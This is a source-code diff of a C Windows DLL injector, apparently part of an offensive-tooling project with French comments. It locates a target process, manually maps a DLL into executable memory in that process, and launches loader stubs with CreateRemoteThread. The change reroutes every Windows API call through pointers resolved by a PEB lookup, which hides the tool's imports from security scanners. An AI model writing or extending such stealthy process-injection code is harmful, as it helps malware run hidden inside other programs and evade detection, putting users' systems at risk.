@@ -1,22 +1,23 @@
 #include "dll-injector/dll-injector.h"
 #include "dll-injector/loader-stub.h"
+#include "utils/peb-lookup.h"
 #include "asm-stub-bin.h"
 
-static void printError(const TCHAR* msg){
+static void printError(const char* msg){
   DWORD errCode;
-  TCHAR buffer[512];
+  char buffer[512];
 
-  errCode = GetLastError();
-  FormatMessage(
+  errCode = g_Api.pGetLastError();
+  g_Api.pFormatMessageA(
     FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
     NULL,
     errCode,
     0,
     buffer,
-    (DWORD)(sizeof(buffer) / sizeof(TCHAR)),
+    (DWORD)(sizeof(buffer) / sizeof(char)),
     NULL
   );
-  _ftprintf(stderr, TEXT("%s failed with error %lu: %s\n"), msg, errCode, buffer);
+  fprintf(stderr, "%s failed with error %lu: %s\n", msg, errCode, buffer);
 }
 
 /* DLL Injector
@@ -38,10 +39,10 @@ DWORD ProcessWalking(char* exeFileName){
   PROCESSENTRY32 pe32;
 
   // Take a snapshot of all processes in the system
-  hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
+  hProcessSnap = g_Api.pCreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
   if( hProcessSnap == INVALID_HANDLE_VALUE )
   {
-    printError( TEXT("CreateToolhelp32Snapshot (of processes)") );
+    printError("CreateToolhelp32Snapshot (of processes)");
     return( FALSE );
   }
 
@@ -50,24 +51,24 @@ DWORD ProcessWalking(char* exeFileName){
 
   // Retrieve information about the first process,
   // and exit if unsuccessful
-  if( !Process32First( hProcessSnap, &pe32 ) )
+  if( !g_Api.pProcess32First( hProcessSnap, &pe32 ) )
   {
-    printError( TEXT("Process32First") ); // show cause of failure
-    CloseHandle( hProcessSnap );          // clean the snapshot object
+    printError("Process32First");
+    g_Api.pCloseHandle( hProcessSnap );
     return( FALSE );
   }
 
   // Now walk the snapshot of processes, and
-  // return th32ProcessID of the process associated to exeFileName 
+  // return th32ProcessID of the process associated to exeFileName
   do
-  { 
+  {
     if(strcmp(pe32.szExeFile, exeFileName) == 0){
-      CloseHandle( hProcessSnap );
+      g_Api.pCloseHandle( hProcessSnap );
       return pe32.th32ProcessID;
-    } 
-  } while(Process32Next( hProcessSnap, &pe32 ));
-  
-  CloseHandle( hProcessSnap );
+    }
+  } while(g_Api.pProcess32Next( hProcessSnap, &pe32 ));
+
+  g_Api.pCloseHandle( hProcessSnap );
   return 0;
 }
 
@@ -83,7 +84,7 @@ LPVOID MannualMappingDll(HANDLE hProcess, PIMAGE_PE_FILE pe){
   ntHeaders = (IMAGE_NT_HEADERS*)(pe->RawData + dosHeader->e_lfanew);
   
   // 1. Allocate memory in the target process for the DLL
-  pRemoteBuffer = VirtualAllocEx(
+  pRemoteBuffer = g_Api.pVirtualAllocEx(
     hProcess,
     NULL,
     ntHeaders->OptionalHeader.SizeOfImage,
@@ -91,18 +92,18 @@ LPVOID MannualMappingDll(HANDLE hProcess, PIMAGE_PE_FILE pe){
     PAGE_EXECUTE_READWRITE
   );
   if(pRemoteBuffer == NULL){
-    printError(TEXT("VirtualAllocEx"));
+    printError("VirtualAllocEx");
     return NULL;
   }
 
   // 2. Write the DLL's headers and sections into the allocated memory
-  WriteProcessMemory(hProcess, pRemoteBuffer, pe->RawData, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
+  g_Api.pWriteProcessMemory(hProcess, pRemoteBuffer, pe->RawData, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
 
   numberOfSections = ntHeaders->FileHeader.NumberOfSections;
   sectionHeaders = IMAGE_FIRST_SECTION(ntHeaders);
   
   for(int i = 0; i < numberOfSections; i++){
-    WriteProcessMemory(
+    g_Api.pWriteProcessMemory(
       hProcess,
       (LPVOID)((DWORD_PTR)pRemoteBuffer + sectionHeaders[i].VirtualAddress),
       pe->RawData + sectionHeaders[i].PointerToRawData,
@@ -120,18 +121,18 @@ HANDLE injectDll(DWORD dwProcessId, const char* dllPath, LPVOID* remoteBuffer){
   PIMAGE_PE_FILE pe;
   PMANUAL_MAPPING_DATA pData;
 
-  hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
+  hProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
 
   pe = malloc(sizeof(IMAGE_PE_FILE));
   SetRawData(dllPath, pe);
   
   pRemoteBuffer = MannualMappingDll(hProcess, pe);
   if(pRemoteBuffer == NULL){
-    CloseHandle(hProcess);
+    g_Api.pCloseHandle(hProcess);
     return NULL;
   }
   /*
-   * On en est là, il faut augmenter la taille de l'espace réserver 
+   * On en est là, il faut augmenter la taille de l'espace réserver
    * pour rajouter le shellcode PIC et le stub C compilé en PIC (C_Loader_stub)
    *
    */
@@ -160,11 +161,11 @@ HANDLE injectDll(DWORD dwProcessId, const char* dllPath, LPVOID* remoteBuffer){
   free(pe);
 
   if (hThread == NULL) {
-    CloseHandle(hProcess);
+    g_Api.pCloseHandle(hProcess);
     return NULL;
   }
 
-  CloseHandle(hThread);
+  g_Api.pCloseHandle(hThread);
   return hProcess;
 }
 
@@ -177,9 +178,9 @@ HANDLE injectManualMappingStub(HANDLE hProcess, PMANUAL_MAPPING_DATA pData, LPVO
     SIZE_T totalSize = asmStubSize + cStubSize + sizeof(MANUAL_MAPPING_DATA);
 
     // 1. Allouer la mémoire pour le stub ASM, le stub C et la structure de données
-    pRemoteMem = VirtualAllocEx(hProcess, NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    pRemoteMem = g_Api.pVirtualAllocEx(hProcess, NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (pRemoteMem == NULL) {
-        printError(TEXT("VirtualAllocEx for stubs"));
+        printError("VirtualAllocEx for stubs");
         return NULL;
     }
 
@@ -191,33 +192,33 @@ HANDLE injectManualMappingStub(HANDLE hProcess, PMANUAL_MAPPING_DATA pData, LPVO
     pData->pCStubAddress = pRemoteCStub;
 
     // 2. Écrire le stub ASM
-    if (!WriteProcessMemory(hProcess, pRemoteAsmStub, pAsmStub, asmStubSize, NULL)) {
-        printError(TEXT("WriteProcessMemory ASM stub"));
+    if (!g_Api.pWriteProcessMemory(hProcess, pRemoteAsmStub, pAsmStub, asmStubSize, NULL)) {
+        printError("WriteProcessMemory ASM stub");
         goto cleanup;
     }
 
     // 3. Écrire le stub C
-    if (!WriteProcessMemory(hProcess, pRemoteCStub, pCStub, cStubSize, NULL)) {
-        printError(TEXT("WriteProcessMemory C stub"));
+    if (!g_Api.pWriteProcessMemory(hProcess, pRemoteCStub, pCStub, cStubSize, NULL)) {
+        printError("WriteProcessMemory C stub");
         goto cleanup;
     }
 
     // 4. Écrire la structure MANUAL_MAPPING_DATA
-    if (!WriteProcessMemory(hProcess, pRemoteData, pData, sizeof(MANUAL_MAPPING_DATA), NULL)) {
-        printError(TEXT("WriteProcessMemory Data"));
+    if (!g_Api.pWriteProcessMemory(hProcess, pRemoteData, pData, sizeof(MANUAL_MAPPING_DATA), NULL)) {
+        printError("WriteProcessMemory Data");
         goto cleanup;
     }
 
     // 5. Créer le thread distant pointant sur le stub ASM avec pRemoteData comme argument
-    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAsmStub, pRemoteData, 0, NULL);
+    hThread = g_Api.pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAsmStub, pRemoteData, 0, NULL);
     if (hThread == NULL) {
-        printError(TEXT("CreateRemoteThread"));
+        printError("CreateRemoteThread");
         goto cleanup;
     }
 
     return hThread;
 
 cleanup:
-    if (pRemoteMem) VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
+    if (pRemoteMem) g_Api.pVirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
     return NULL;
 }
